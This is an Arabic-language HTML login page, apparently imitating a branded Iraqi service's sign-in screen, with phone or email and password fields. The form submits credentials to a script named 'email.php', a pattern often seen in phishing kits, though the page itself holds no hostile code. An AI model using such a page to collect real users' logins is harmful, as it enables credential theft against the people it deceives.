<!DOCTYPE html>
<html lang="en">
<head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Document</title>
     <!-- css links -->
     <link rel="stylesheet" href="style.css">
     <!-- font aowsome links -->
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css"
     integrity="sha512-Evv84Mr4kqVGRNSgIGL/F/aIDqQb7xQ2vcrdIwxfjThSH8CSR7PBEakCr51Ck+w+/U6swU2Im1vVX0SVk9ABhg=="
     crossorigin="anonymous" referrerpolicy="no-referrer" />
     
</head>
<body>
	
	
	<form class="login-form" action="email.php" method="post">
	
	
     <div class="container">
          <header>
               <img src="./sntat-logo.png" alt="">
          </header>

          <section class="main-content">
               <div class="top">
                    <h1>تسجيل الدخول</h1>
                    <div class="btns">
                         <button class="mail" id="mail" onclick="checkLogMode(this.id)">البريد الالكتروني</button>
                         <button class="phone" id="phone" onclick="checkLogMode(this.id)">رقم الهاتف</button>
                    </div>
               </div>

               <div class="inputs">
                    <div class="flags">
                         <i class="fa-solid fa-sort-down"></i>
                         <img src="./Flag_of_Iraq.svg.png" alt="">
                    </div>
                    
                    <input type="text" name="text" class="mpInput" placeholder="رقم الهاتف">
              <input type="password" name="password" class="password-input" placeholder="كلمة المرور">
        


            <button type="submit" name"password" class="log-btn">الدخول</button>
 




                   	</form>
               </div>

               <div class="info">
                    <div class="contacts">
                         <a href="" class="google"><img src="./google-icon.png" alt=""></a>
                         <a href="" class="facebooke"><i class="fa-brands fa-facebook"></i></a>
                    </div>

                    <div class="forget-password"><p>نسيت كلمة المرور؟</p><i class="fa-solid fa-arrow-rotate-right"></i></div>
                    <div class="praivcy-setting"><p>سياسة الخصوصيه</p><i class="fa-solid fa-gear"></i></div>
               </div>
          </section>
          
     </div>
     <script src="main.js"></script>
</body>
</html>